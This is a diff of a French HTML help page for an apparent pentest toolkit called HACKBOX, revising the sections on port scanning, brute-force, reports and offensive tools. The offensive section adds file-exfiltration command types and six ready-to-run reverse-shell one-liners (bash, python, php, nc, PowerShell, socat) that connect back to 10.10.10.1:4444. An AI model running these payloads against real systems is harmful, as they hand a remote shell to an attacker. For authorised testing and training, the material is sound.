@@ -252,17 +252,24 @@
         <div class="section">
           <h2 id="menu-scan">1. Scan & Fingerprinting</h2>
           <div class="card"><div class="card-body">
-            <b>Objectif :</b> Découvrir les services, ports ouverts et technologies d’un ordinateur ou d’un site web cible.<br><br>
-            <b>Pour qui ?</b> Accessible à tous, même sans aucune expérience technique.<br><br>
-            <b>Fonctionnement détaillé :</b>
+            <b>Objectif :</b> Scanner les ports d'une cible (IP ou domaine) pour identifier les services, bannières, versions, et technologies exposées.<br><br>
+            <b>Menu principal :</b>
             <ul>
-              <li><b>Adresse cible :</b> Entrez simplement l’adresse IP (ex : <code>192.168.1.10</code>) ou le nom du site (ex : <code>scanme.nmap.org</code>).</li>
-              <li><b>Ports :</b> Si vous ne savez pas, laissez vide : HACKBOX scannera les ports les plus courants (web, SSH, FTP, etc.).</li>
-              <li><b>Résultat :</b> La liste des ports ouverts, les services détectés (ex : HTTP, SSH), les versions logicielles et parfois même le système d’exploitation.</li>
-              <li><b>Pourquoi c’est utile ?</b> Cela permet de savoir « ce qui est exposé » sur une machine, étape de base de tout pentest.</li>
+              <li>Scan de ports (TCP, 1-1024 par défaut, ou plage personnalisée)</li>
             </ul>
-            <b>Exemple :</b> Entrez <code>scanme.nmap.org</code> et validez. Vous verrez apparaître les services accessibles publiquement.<br><br>
-            <b>Export :</b> Les résultats sont enregistrés dans <code>exports/&lt;date&gt;/scan/</code> (formats .md/.json pour une lecture ou un partage facile).
+            <b>Champs demandés :</b>
+            <ul>
+              <li><b>Cible :</b> IP ou nom de domaine (ex : <code>192.168.1.10</code>, <code>site.com</code>)</li>
+              <li><b>Ports :</b> Liste ou plage (ex : <code>22,80,443</code> ou <code>1-1024</code>)</li>
+            </ul>
+            <b>Explications :</b>
+            <ul>
+              <li>Le scan détecte les ports ouverts, services, bannières, versions, et technologies (si disponibles).</li>
+              <li>Le scan se fait en multithread pour plus de rapidité.</li>
+              <li>Les résultats sont affichés directement dans le terminal.</li>
+            </ul>
+            <b>Export :</b> Les résultats du scan sont utilisés pour la suite des modules (pas d'export automatique à cette étape, sauf si intégré dans un rapport global).
+            <br><b>Conseil :</b> Scanner uniquement des cibles autorisées. Privilégier des plages raisonnables pour éviter d'être détecté ou bloqué.
           </div></div>
         </div>
         <div class="section">
@@ -315,7 +322,7 @@
               <li><b>Cible :</b> IP ou URL du service à tester (ex : <code>192.168.1.10</code>, <code>ftp.site.com</code>, <code>http://site.com/login</code>)</li>
               <li><b>Userlist :</b> Fichier texte contenant les noms d’utilisateurs à tester (exemple : <code>users.txt</code> avec un utilisateur par ligne)</li>
               <li><b>Passlist :</b> Fichier texte contenant les mots de passe à tester (exemple : <code>passwords.txt</code> avec un mot de passe par ligne)</li>
-              <li><b>Mots-clés succès/échec :</b> Chaînes ou codes à rechercher dans la réponse pour déterminer si la connexion a réussi ou échoué (ex : <code>Welcome</code>, <code>Login failed</code>, code HTTP 200/401, etc.)</li>
+              <li><b>Mots-clés succès/échec :</b> Chaînes à rechercher dans la réponse pour déterminer si la connexion a réussi ou échoué (ex : <code>Welcome</code>, <code>Login failed</code>, code HTTP 200/401, etc.)</li>
               <li><b>Délais/tentatives :</b> Temps d’attente entre les essais (en secondes), nombre max de tentatives avant pause (ex : 0.5s, 5 tentatives)</li>
               <li><b>Protocole :</b> (pour le password spraying) : <code>ssh</code>, <code>ftp</code>, <code>http</code></li>
               <li><b>Champs formulaire HTTP :</b> (pour brute-force HTTP) : <code>user_field</code>, <code>pass_field</code>, <code>method</code> (POST/GET), <code>extra_data</code> (pour champs additionnels)</li>
@@ -491,56 +498,94 @@ cookie
         <div class="section">
           <h2 id="menu-report">7. Rapports & Export</h2>
           <div class="card"><div class="card-body">
-            <b>Objectif :</b> Générer des rapports globaux, exports journaliers, branding personnalisé.<br><br>
-            <b>Pour qui ?</b> Toute personne souhaitant synthétiser ou partager les résultats d’une session.<br><br>
-            <b>Champs demandés :</b>
+            <b>Objectif :</b> Générer, organiser et exporter des rapports détaillés pour chaque module du toolkit, facilitant l’analyse, la restitution et la traçabilité des actions.<br><br>
+            <b>Pour qui ?</b> Pentesters, RSSI, auditeurs, étudiants, toute personne souhaitant documenter un test ou une analyse.<br><br>
+            <b>Sous-menus détaillés :</b>
             <ul>
-              <li><b>Format :</b> txt, md, html</li>
-              <li><b>Branding/logo :</b> Personnalisation du rapport</li>
-              <li><b>Export :</b> Où sauvegarder le rapport</li>
+              <li><b>1. Export automatique :</b> Chaque module exporte automatiquement ses résultats dans un dossier <code>exports/&lt;date&gt;/&lt;module&gt;/</code> (formats .json, .md, .html).</li>
+              <li><b>2. Rapports détaillés :</b> Génération de rapports synthétiques ou complets, avec logs, statistiques, détails techniques, conseils de remédiation.</li>
+              <li><b>3. Organisation par module :</b> Les exports sont structurés par date, par type de test, et par cible pour faciliter la navigation.</li>
+              <li><b>4. Export personnalisés :</b> Possibilité de filtrer, d’anonymiser ou de formater les exports selon les besoins (ex : rapport client, rapport technique, logs bruts).</li>
             </ul>
-            <b>Explications :</b>
+            <b>Champs et options (avec exemples) :</b>
             <ul>
-              <li>Compile tous les résultats de la session en un rapport lisible et partageable, daté par jour.</li>
-              <li>Le branding permet d’ajouter un logo ou un style personnalisé au rapport.</li>
-              <li>Les exports sont organisés par date pour faciliter le suivi.</li>
+              <li><b>Format :</b> <code>json</code>, <code>md</code>, <code>html</code> (ex : <code>rapport_vuln.json</code>, <code>loot.md</code>)</li>
+              <li><b>Module concerné :</b> <code>bruteforce</code>, <code>fuzzing</code>, <code>osint</code>, <code>loot</code>, <code>escalade</code>, <code>offensif</code>, etc.</li>
+              <li><b>Options avancées :</b> Anonymisation, filtrage, tri, export par lot.</li>
             </ul>
-            <b>Exemple d’utilisation :</b>
+            <b>Explications pédagogiques et conseils :</b>
             <ul>
-              <li>Générer un rapport Markdown avec tous les résultats du jour.</li>
-              <li>Exporter un rapport HTML pour un client avec branding personnalisé.</li>
+              <li>Tous les résultats sont exportés automatiquement à chaque étape, pour garantir la traçabilité et faciliter la rédaction de rapports finaux.</li>
+              <li>Les formats <code>json</code> et <code>md</code> sont adaptés à l’automatisation et à la génération de rapports personnalisés.</li>
+              <li>Les rapports <code>html</code> sont lisibles dans un navigateur et peuvent être partagés facilement.</li>
+              <li>Les exports sont datés et structurés pour permettre un suivi chronologique et par cible.</li>
+              <li>Des conseils de remédiation ou des liens vers les CVE/exploits sont inclus dans les rapports vulnérabilités.</li>
             </ul>
-            <b>Export :</b> <code>exports/&lt;date&gt;/report/</code> (rapports générés).
+            <b>Exemples d’utilisation :</b>
+            <ul>
+              <li>Générer un rapport complet de brute-force SSH en <code>bruteforce_ssh_20250415.html</code>.</li>
+              <li>Exporter tous les résultats OSINT d’un batch d’emails en <code>osint_20250415.json</code>.</li>
+              <li>Filtrer les logs de loot pour ne garder que les extractions de tokens.</li>
+            </ul>
+            <b>Exemple d’arborescence d’exports :</b><br>
+            <pre>exports/
+  20250415/
+    bruteforce_ssh/
+      bruteforce_ssh_20250415.html
+    osint/
+      osint_20250415.json
+    loot/
+      loot_20250415.md
+    escalade/
+      escalade_20250415.html
+    offensif/
+      reverse_shells_20250415.md
+</pre>
+            <b>Conseil :</b> Sauvegardez régulièrement les exports, anonymisez les rapports avant diffusion externe, et conservez les logs bruts pour audit.
           </div></div>
         </div>
         <div class="section">
           <h2 id="menu-offensive">8. Outils offensifs & Exploitation</h2>
           <div class="card"><div class="card-body">
-            <b>Objectif :</b> Générer et lancer des commandes d’exploitation (reverse shells, stagers, exploits externes).<br><br>
-            <b>Pour qui ?</b> Idéal pour s’initier à l’exploitation sans risque, chaque étape est expliquée.<br><br>
-            <b>Sous-menus :</b>
+            <b>Objectif :</b> Générer et utiliser des payloads d’exploitation (reverse shells, stagers, exploits publics) pour tester la compromission d’une cible.<br><br>
+            <b>Pour qui ?</b> Pentesters, red team, formateurs en sécurité, étudiants.<br><br>
+            <b>Sous-menus détaillés :</b>
             <ul>
-              <li>1. Génération de reverse shells (bash, powershell, etc.)</li>
-              <li>2. Génération de stagers Metasploit</li>
+              <li><b>1. Génération de reverse shells :</b> Création automatique de commandes/payloads pour obtenir un shell distant sur la cible (bash, python, php, nc, powershell, socat, etc.).</li>
+              <li><b>2. Génération de stagers :</b> Création de scripts d’initialisation pour charger des payloads plus complexes (multi-stage).</li>
+              <li><b>3. Téléchargement/Upload de fichiers :</b> Génération de commandes pour exfiltrer ou injecter des fichiers sur la cible (wget, curl, certutil, bitsadmin, etc.).</li>
+              <li><b>4. Utilisation d’exploits publics :</b> Intégration de PoC/exploits connus (CVE, ExploitDB, Metasploit) pour tester des vulnérabilités spécifiques.</li>
             </ul>
-            <b>Champs demandés :</b>
+            <b>Champs demandés (avec exemples) :</b>
             <ul>
-              <li><b>Langage :</b> bash, python, powershell, etc.</li>
-              <li><b>Adresse IP/port :</b> Pour la connexion reverse</li>
-              <li><b>Export :</b> Voulez-vous sauvegarder le payload généré ? (Oui/Non)</li>
+              <li><b>Langage/Protocole :</b> <code>bash</code>, <code>python</code>, <code>php</code>, <code>nc</code>, <code>powershell</code>, <code>socat</code>, etc.</li>
+              <li><b>LHOST/LPORT :</b> Adresse IP et port d’écoute pour le reverse shell (ex : <code>10.10.10.1</code>, <code>4444</code>)</li>
+              <li><b>Exploit cible :</b> CVE, nom de vulnérabilité ou chemin vers un PoC (ex : <code>CVE-2021-44228</code>, <code>exploit.py</code>)</li>
             </ul>
-            <b>Explications :</b>
+            <b>Explications pédagogiques et conseils :</b>
             <ul>
-              <li>Propose des commandes prêtes à l’emploi à copier-coller pour obtenir un shell distant ou lancer un exploit.</li>
-              <li>Chaque sous-menu cible un type de payload ou d’exploitation différent.</li>
-              <li>Les résultats sont exportés pour une réutilisation rapide.</li>
+              <li>Le reverse shell permet de prendre le contrôle d’une machine distante en faisant sortir la connexion de la cible vers l’attaquant.</li>
+              <li>Les stagers sont utiles pour contourner les restrictions de taille ou de détection (multi-stage, obfuscation, etc.).</li>
+              <li>Les payloads générés sont adaptés au contexte (OS, droits, restrictions réseau).</li>
+              <li>La base d’exploits publics permet de tester rapidement des failles connues (avec liens vers ExploitDB, Metasploit, etc.).</li>
+              <li>Les logs détaillent chaque commande générée, chaque tentative d’exploitation, et sont exportables en JSON, Markdown, HTML.</li>
             </ul>
-            <b>Exemple d’utilisation :</b>
+            <b>Exemples d’utilisation :</b>
             <ul>
-              <li>Générer un reverse shell bash pour une connexion sur 10.10.10.10:4444.</li>
-              <li>Créer un stager Metasploit prêt à utiliser.</li>
+              <li>Générer un reverse shell bash pour <code>10.10.10.1:4444</code> et l’injecter via une faille RCE.</li>
+              <li>Créer un stager PowerShell pour charger un payload Meterpreter.</li>
+              <li>Tester un exploit public CVE-2021-44228 sur une cible vulnérable.</li>
             </ul>
-            <b>Export :</b> <code>exports/&lt;date&gt;/offensive/</code> (payloads générés).
+            <b>Exemple de reverse shells générés :</b><br>
+            <pre>bash -i &gt;&amp; /dev/tcp/10.10.10.1/4444 0&gt;&amp;1
+python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+nc -e /bin/bash 10.10.10.1 4444
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+socat TCP:10.10.10.1:4444 EXEC:/bin/bash
+</pre>
+            <b>Export :</b> Les résultats sont enregistrés dans <code>exports/&lt;date&gt;/offensif/</code> (formats .json/.md/.html avec logs détaillés par type et par cible).
+            <br><b>Conseil sécurité :</b> N’utilisez jamais ces outils sans autorisation explicite, et vérifiez la légalité des exploits publics utilisés.
           </div></div>
         </div>
         <div class="section">
